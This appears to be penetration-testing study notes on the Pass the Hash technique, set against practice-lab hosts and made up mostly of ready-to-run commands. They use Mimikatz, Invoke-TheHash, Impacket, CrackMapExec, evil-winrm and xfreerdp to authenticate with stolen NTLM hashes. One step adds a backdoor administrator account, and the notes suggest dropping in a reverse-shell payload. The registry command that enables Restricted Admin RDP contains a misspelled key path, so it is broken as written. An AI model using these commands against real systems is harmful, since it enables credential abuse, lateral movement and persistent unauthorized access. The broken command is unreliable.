---
description: >-
  Is a technique where an attacker uses a password hash instead of the plain
  text password
---

# Pass the Hash (PtH)

the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

* Dumping the local SAM database from a compromised host.
* Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
* Pulling the hashes from memory (lsass.exe).

### Mimikatz

```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

* `/user` - The user name we want to impersonate.
* `/rc4` or `/NTLM` - NTLM hash of the user's password.
* `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
* `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

> Note that: Mimikatz is one of the most useful tools that we will be using in the future for active directory boxes. Some additional points to be noted about Mimikatz.
>
> 1. You can run it with just mimikatz.exe and then slowly specify other commands.
> 2. To extract the hashes presented in the current session, instead of running `sekurlsa::pth` we can run `sekurlsa::logonpasswords` additional information could be found in the [`HackTricks`](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz) website

### Invoke-TheHash(PS)

To download the tools, access [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) github.

```powershell-session
Import-Module .\Invoke-TheHash.psd1
```

<pre class="language-powershell-session"><code class="lang-powershell-session"><strong>Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add &#x26;&#x26; net localgroup administrators mark /add" -Verbose
</strong></code></pre>

* `Target` - Hostname or IP address of the target.
* `Username` - Username to use for authentication.
* `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
* `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
* `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

> we can use reverse shell payload in the Command section of the code (`PowerShell #3 (Base64)`) and for the target we can specify machine name instead of IP address (either would work).

### Impacket

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Following tools also works with PtH:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### CrackMapExec

**Pass the Hash with CrackMapExec**

```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**CrackMapExec - Command Execution**

```shell-session
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### evil-winrm

```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

### RDP

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

> for this method to work we have to set the value for `DisableRestrictedAdmin` as 0.
>
> To enable run:
>
> ```cmd-session
> reg add HKLM\Systeinvm\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> ```
>
> &#x20;Otherwise we will get the following error.
>
> <img src="../../../.gitbook/assets/image.png" alt="" data-size="original">



